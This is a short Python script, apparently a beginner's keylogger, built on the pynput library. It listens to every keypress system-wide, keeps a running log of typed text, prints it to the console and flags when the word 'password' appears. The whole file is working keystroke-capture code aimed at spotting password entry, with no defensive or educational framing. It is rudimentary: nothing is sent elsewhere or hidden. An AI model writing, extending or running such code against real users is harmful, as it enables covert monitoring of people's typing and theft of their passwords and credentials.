import pynput.keyboard

log = ""

def process_keys(key):
    global log
    try:
        log = log + str(key.char)
    except:
        if key == key.backspace:
            log = log[:-1]
        if key == key.space:
            log = log + " "
    print(log)
    if "password" in log:
        print("log contains \"password\"")
        print(log)
    else:
        print("log does not contain \"password\"")
        print(log)
        
keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
with keyboard_listener:
    keyboard_listener.join()